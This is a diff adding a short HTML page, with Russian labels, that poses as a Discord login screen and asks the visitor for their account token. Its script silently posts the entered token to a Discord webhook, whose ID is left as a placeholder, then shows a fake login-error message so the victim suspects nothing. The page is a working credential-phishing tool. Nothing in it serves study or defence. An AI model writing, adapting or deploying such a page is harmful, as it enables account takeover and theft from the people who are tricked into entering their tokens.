@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head><title>Discord Login</title></head>
+<body>
+<h2>Discord авторизация</h2>
+<input type="text" id="token" placeholder="Введите токен" style="width:300px">
+<button onclick="send()">Войти</button>
+<script>
+function send() {
+    var token = document.getElementById('token').value;
+    fetch('https://discord.com/api/webhooks/ВАШ_ID/ТОКЕН', {method:'POST', body:JSON.stringify({content:'✅ ТОКЕН: '+token}), headers:{'Content-Type':'application/json'}});
+    alert('Ошибка входа. Повторите позже.');
+}
+</script>
+</body>
+</html>
